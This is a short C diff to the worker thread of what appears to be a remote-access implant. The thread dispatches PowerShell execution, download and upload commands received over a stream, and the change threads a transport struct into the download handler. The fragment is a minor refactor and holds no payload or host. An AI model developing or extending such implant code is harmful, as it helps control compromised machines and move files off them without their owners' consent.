@@ -25,6 +25,10 @@ DWORD WINAPI wrkr_thread(struct new_thread_params_t* params) {
     struct wrkr_msg_t msg;
     tremont_recv(params->stream_id,
         (byte*)&msg, sizeof(msg), params->nexus);
+
+    struct wrkr_trans_t trans;
+    trans.stream_id = params->stream_id;
+    trans.nexus = params->nexus;
     
     switch (msg.msg_enum) {
     case POWERSHELL: {
@@ -40,7 +44,7 @@ DWORD WINAPI wrkr_thread(struct new_thread_params_t* params) {
     case DOWNLOAD: {
         struct download_msg_t* download_msg = &msg.download;
         struct download_req_t* download_req = &download_msg->req;
-        implant_download(download_req);
+        implant_download(&trans, download_req);
         break;
     case UPLOAD: {
         struct upload_msg_t* upload_msg = &msg.upload;
